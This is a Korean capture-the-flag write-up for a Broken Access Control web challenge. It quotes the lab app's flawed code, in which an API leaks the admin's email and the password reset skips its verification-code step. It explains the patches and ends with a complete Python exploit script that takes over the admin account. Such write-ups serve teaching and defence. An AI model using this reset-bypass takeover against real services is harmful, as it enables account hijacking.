# medium-03 — 잊어버린 비밀번호 (BAC) 풀이

## 1. 문제 개요

| 항목 | 내용 |
|---|---|
| 분류 | Web / Broken Access Control (접근 통제 결함) |
| 난이도 | Medium |
| 접속 | `http://<출제조IP>:8003` |
| 제공 계정 | `applicant01 / test1234` (+ 소스 제공) |
| 플래그 형식 | `GlassHouse{...}` (환경변수 `FLAG_TAKEOVER`) |

**최종 목표:** 운영진 전용 화면 `/admin`에 접근해 "내부 인증 코드"로 노출되는 플래그를 읽는다.
`/admin`은 `role == "admin"` 세션만 허용하며, 해당 권한을 가진 계정은 `reviewer` 하나뿐이다.
따라서 목표는 **관리자 이메일 확보 → reviewer 비밀번호 재설정 → 관리자 화면 접근**으로 귀결된다.

---

## 2. 의도한 풀이 과정 (요약)

1. 플래그가 `/admin` 목록 화면에 박혀 있고, 이 화면은 관리자(admin) 역할만 들어갈 수 있음을 확인한다.
2. 관리자 역할은 `reviewer`뿐 → 로그인 수단(비밀번호 재설정)을 공략 대상으로 정한다.
3. 재설정 1단계 `/forgot`은 **아이디+이메일**이 맞아야 통과한다. 그런데 reviewer의 이메일은 소스에 없고 런타임 비밀값(`secret("ADMIN_EMAIL")`)이다 → **이메일을 어딘가에서 유출시켜야 한다.**
4. 소스(`data.py`)를 보면 신청서 레코드 `APPLICATIONS[50]`에 `email: secret("ADMIN_EMAIL")`이 박혀 있고, 이 레코드의 소유자는 **subAdmin(user_id 50)** 이다. subAdmin 계정 자격증명(`subAdmin / subpwd`)도 소스에 평문으로 들어 있다.
5. **subAdmin으로 로그인** → `GET /api/applications/50` → 응답 JSON에 reviewer의 이메일이 그대로 노출된다 (**관리자 이메일 유출**).
6. 유출한 이메일로 `/forgot`을 통과한다. 이때 "사고 방지용" 보호 목록 `PROTECTED`에 정작 관리자 `reviewer`가 빠져 있어 재설정이 허용된다(**결함 ①**).
7. 마지막 단계 `/forgot/reset`이 인증코드 통과 여부(`reset_verified`)를 확인하지 않는다 → **이메일로 온 6자리 코드를 모르고도** 2단계를 건너뛰고 비밀번호를 바꾼다(**결함 ②**).
8. 바뀐 비밀번호로 reviewer 로그인 → `/admin`에서 플래그를 읽는다.

---

## 3. 초기 분석과 단서

### 3-1. 플래그는 관리자 화면에 있다
`templates/admin/list.html`:

```html
<div class="alert alert-info">운영진 전용 · 내부 인증 코드 {{ config.FLAG_TAKEOVER }}</div>
```

이 화면을 그리는 `/admin`은 관리자 전용이다 — `routes/admin.py`의 `require_admin()`은 `role != "admin"`이면 `abort(403)`으로 정상 동작한다. 즉 **정면 돌파는 불가**하고 admin 세션을 합법적으로 얻어야 한다.

### 3-2. admin 역할은 reviewer 하나뿐
`data.py`:

```python
USERS = {
    "applicant01": {"id": 1,  "password": "test1234", "role": "applicant", "email": "applicant01@example.com"},
    "applicant02": {"id": 7,  "password": "s3cr3t",   "role": "applicant", ...},
    "reviewer":    {"id": 99, "password": secret("ADMIN_PASSWORD"), "role": "admin",
                    "email": secret("ADMIN_EMAIL")},
    "subAdmin":    {"id": 50, "password": "subpwd",   "role": "staff",  "email": "staff@glasshouse.ac.kr"},
}
```

로그인 시 `session["role"] = user["role"]`이 그대로 들어가므로, reviewer로 로그인하면 admin 세션이 된다.
reviewer의 비밀번호·이메일은 모두 `secret()`(= `.env` 런타임 비밀)이라 **소스만 봐서는 알 수 없다.**

### 3-3. 비밀번호 재설정에는 reviewer 이메일이 필요하다
`routes/auth.py`의 `/forgot`은 `user["email"] != email`이면 거부한다. 따라서 재설정을 시작하려면 **reviewer의 실제 이메일을 먼저 알아내야** 한다. → 유출 경로를 찾는 것이 첫 과제.

### 3-4. 관리자 이메일이 신청서 레코드에 박혀 있다
`data.py`의 신청서 데이터:

```python
APPLICATIONS = {
    ...
    50: {
        "id": 50, "user_id": 50, "applicant_name": "이정욱",
        "school": "글래스하우스", "major": "일반석",
        "intro": "...", "status": "submitted",
        "email": secret("ADMIN_EMAIL")        # ← 관리자 이메일이 레코드에 들어있음
    }
}
```

`APPLICATIONS[50]`의 소유자는 `user_id = 50`, 즉 **subAdmin**이다. 그리고 subAdmin의 자격증명 `subAdmin / subpwd`는 소스에 평문으로 노출되어 있다 → subAdmin으로 직접 로그인할 수 있다.

---

## 4. 취약점의 원인과 성립 조건

### 결함 A — API가 레코드 전체를 반환해 민감정보(관리자 이메일)가 유출됨

`routes/mypage.py`:

```python
@bp.get("/api/applications/<int:app_id>")
def api_detail(app_id):
    user_id = session.get("user_id")
    if user_id is None:
        return jsonify({"error": "로그인이 필요합니다."}), 401
    application = data.APPLICATIONS.get(app_id)
    if application is None:
        return jsonify({"error": "없는 신청서입니다."}), 404
    if application["user_id"] != user_id:
        return jsonify({"error": "권한이 없습니다."}), 403
    return jsonify(application)              # ← email 등 레코드 전체를 그대로 반환
```

소유권 검사 자체는 있지만, **subAdmin은 app #50의 정당한 소유자**(user_id 50 == 50)이므로 검사를 통과한다. 문제는 이 API가 **레코드 전체(email 포함)를 직렬화해서 돌려준다**는 점이다. 관리자 이메일이 staff 소유 신청서에 저장되어 있는 설계상 실수와 맞물려, subAdmin이 자기 신청서를 조회하는 것만으로 **관리자 이메일이 유출**된다.

- **성립 조건:** subAdmin으로 로그인(자격증명은 소스에 평문) → `GET /api/applications/50`.
- **실제 응답(검증):**
  ```json
  {"id":50,"user_id":50,"applicant_name":"이정욱","school":"글래스하우스",
   "major":"일반석","status":"submitted","intro":"...",
   "email":"reviewer@glasshouse.ac.kr"}
  ```

### 결함 B — 보호 목록에서 관리자 계정이 누락 (`/forgot`)

```python
PROTECTED = {"applicant01", "applicant02", "subAdmin"}

def forgot():
    ...
    if user is None or username in PROTECTED or user["email"] != email:
        flash("아이디 또는 이메일이 올바르지 않습니다.", "error")
        return render_template("auth/forgot.html")
    ...
    session["reset_user"] = username
    session.pop("reset_verified", None)
    return redirect(url_for("auth.verify"))
```

README는 "신청자 계정은 사고가 나지 않도록 따로 막아 두었다"고 안내한다. 실제로 `applicant01/02`, `subAdmin`은 막혀 있다. **그러나 진짜 민감한 관리자 계정 `reviewer`는 목록에 없다.** 보호 대상을 거꾸로 설정한 접근 통제 결함 — reviewer가 재설정 대상이 될 수 있다. (유출한 이메일로 `email` 검사도 통과한다.)

`/forgot` 통과 시 `session["reset_user"] = "reviewer"`가 설정되고, 6자리 코드는 **서버 로그로만** 출력된다(`print(...)`) — 공격자는 이 코드를 볼 수 없다. 정상이라면 여기서 막혀야 한다.

### 결함 C — 마지막 단계가 인증 통과 여부를 확인하지 않음 (`/forgot/reset`) ★핵심

```python
def verify():
    ...
    del RESET_CODES[username]
    session["reset_verified"] = True        # ← 코드를 맞혀야만 세워지는 플래그
    return redirect(url_for("auth.reset"))

def reset():
    username = session.get("reset_user")
    if username is None :                    # ← reset_user 존재 여부만 확인
        flash("본인 확인을 먼저 진행해 주십시오.", "error")
        return redirect(url_for("auth.forgot"))
    if request.method == "POST":
        password = request.form.get("password", "")
        ...
        data.USERS[username]["password"] = password   # ← 비밀번호 변경
```

`reset()`은 **`reset_verified`를 전혀 검사하지 않고** `reset_user`만 있으면 비밀번호를 바꿔 버린다. 결과적으로 `/forgot/verify`(코드 입력) 단계를 통째로 건너뛰고 `/forgot` 직후 `/forgot/reset`에 바로 POST하면, 코드를 모른 채 reviewer 비밀번호를 원하는 값으로 바꿀 수 있다 — 상태 머신의 "검증 완료" 상태를 강제하지 않은 전형적 **단계 우회(Broken Access Control)**.

> 참고(운영 이슈): 변경된 비밀번호는 DB가 아니라 프로세스 메모리의 전역 `data.USERS`에 저장된다. 서버 한 대를 여러 팀이 공유하면 reviewer 비밀번호가 서로 덮어써져 재현이 깨진다 → **팀별 인스턴스(컨테이너 분리)** 운영이 필요한 이유다.

---

## 5. 풀이 결과

### 성공 판별 기준
1. subAdmin 세션으로 `GET /api/applications/50` 응답 JSON에 `email` 필드가 포함된다.
2. `/forgot/reset` POST 이후 `/login`에 `reviewer / <새 비밀번호>`로 로그인 성공(세션 `role=admin`).
3. `/admin` 응답 본문에 `내부 인증 코드 GlassHouse{...}` 문자열이 포함된다.

### 최종 출력 예시 (로컬 검증)
```
1) subAdmin login: 302
2) leaked admin email: reviewer@glasshouse.ac.kr
3) /forgot: 302            (reset_user=reviewer 세션 설정)
4) /forgot/reset: 302      (verify 단계 건너뜀, 비밀번호 변경)
5) reviewer login: 302     (admin 세션 획득)
6) /admin: 200  FLAG: GlassHouse{...}
```
> 플래그 실제 값은 배포본 `.env`의 `FLAG_TAKEOVER`를 따른다. (환경변수 미설정 시 기본값 `GlassHouse{dummy_flag_not_set}`이 노출되므로, 출제 시 `.env` 설정을 반드시 확인한다.)

---

## 6. 패치 방안과 검증

### 패치 ① — 최종 단계에서 인증 완료 상태를 강제 (핵심)
```python
def reset():
    username = session.get("reset_user")
    if username is None or not session.get("reset_verified"):   # ← 추가
        flash("본인 확인을 먼저 진행해 주십시오.", "error")
        return redirect(url_for("auth.forgot"))
    ...
```

### 패치 ② — 보호 목록을 화이트리스트 기반으로 전환
막을 계정을 열거하는 블랙리스트(`PROTECTED`)는 관리자 누락 같은 실수가 난다. **재설정을 허용할 역할만 허용**한다.
```python
RESETTABLE_ROLES = {"applicant"}
def forgot():
    ...
    if user is None or user["role"] not in RESETTABLE_ROLES or user["email"] != email:
        ...
```

### 패치 ③ — 민감정보 노출 차단
- API가 레코드 전체를 반환하지 말고 **필요한 필드만** 직렬화한다(`email` 등 제외).
  ```python
  return jsonify({k: application[k] for k in ("id","applicant_name","school","major","status","intro")})
  ```
- 애초에 **관리자 이메일을 일반 신청서 레코드에 저장하지 않는다**(`APPLICATIONS[50]`의 `email` 제거).
- subAdmin의 평문·약한 비밀번호(`subpwd`)를 제거하고, 운영 계정 자격증명을 소스에 하드코딩하지 않는다.

### (권장) 부가 강화
- 아이디/이메일 유효 여부와 무관하게 동일 응답을 주어 **계정 열거** 차단.
- 재설정 상태를 세션 불린이 아니라 **서명된 1회용·단기 만료 토큰**으로 관리해 단계 위조를 구조적으로 차단.

### 검증 방법
- (음성) 패치 ① 후: `/forgot` 직후 `/forgot/verify`를 건너뛰고 `/forgot/reset` POST → `/forgot`으로 되돌려지고 비밀번호가 바뀌지 않음.
- (음성) 패치 ② 후: `username=reviewer`로 `/forgot` 요청 시 거부됨.
- (음성) 패치 ③ 후: subAdmin으로 `GET /api/applications/50` 응답에 `email` 필드가 없음.
- (양성) 정상 `applicant`가 코드까지 입력하는 전체 흐름으로는 여전히 재설정 성공.

---

## 7. 익스플로잇 코드

```python
#!/usr/bin/env python3
# medium-03 (BAC) - 관리자 이메일 유출 -> reviewer 계정 탈취 -> /admin 플래그
# 사용: python3 exploit.py http://<IP>:8003
import re
import sys
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8003"
NEW_PW = "pwned_by_bac_123!"

s = requests.Session()  # 세션 쿠키(gh_8003) 자동 관리

# 1) subAdmin 로그인 (자격증명은 소스 data.py에 평문: subAdmin / subpwd)
r = s.post(f"{BASE}/login", data={"username": "subAdmin", "password": "subpwd"},
           allow_redirects=False)
print(f"[*] subAdmin login      -> {r.status_code}")

# 2) /api/applications/50 : subAdmin이 소유한 신청서에서 관리자 이메일 유출
r = s.get(f"{BASE}/api/applications/50")
email = r.json()["email"]
print(f"[+] leaked admin email  -> {email}")

s.get(f"{BASE}/logout")  # 세션 초기화

# 3) /forgot : reviewer + 유출 이메일 -> reset_user 세션 설정 (reviewer는 PROTECTED 아님)
r = s.post(f"{BASE}/forgot", data={"username": "reviewer", "email": email},
           allow_redirects=False)
print(f"[*] /forgot             -> {r.status_code}")
if r.status_code != 302:
    sys.exit("[-] /forgot 실패: 유출 이메일 확인 필요")

# 4) /forgot/reset : 결함C - verify(인증코드) 단계를 건너뛰고 바로 비밀번호 변경
r = s.post(f"{BASE}/forgot/reset",
           data={"password": NEW_PW, "password_confirm": NEW_PW},
           allow_redirects=False)
print(f"[*] /forgot/reset       -> {r.status_code}  (인증코드 없이 비밀번호 변경)")

# 5) 바뀐 비밀번호로 reviewer 로그인 -> admin 세션 획득
r = s.post(f"{BASE}/login", data={"username": "reviewer", "password": NEW_PW},
           allow_redirects=False)
print(f"[*] reviewer login      -> {r.status_code}")

# 6) /admin 에서 플래그 추출
r = s.get(f"{BASE}/admin")
m = re.search(r"GlassHouse\{[^}]*\}", r.text)
print(f"[+] FLAG: {m.group(0)}" if m else "[-] 플래그를 찾지 못함")
```

**실행 예시**
```bash
$ python3 exploit.py http://127.0.0.1:8003
[*] subAdmin login      -> 302
[+] leaked admin email  -> reviewer@glasshouse.ac.kr
[*] /forgot             -> 302
[*] /forgot/reset       -> 302  (인증코드 없이 비밀번호 변경)
[*] reviewer login      -> 302
[+] FLAG: GlassHouse{...}
```
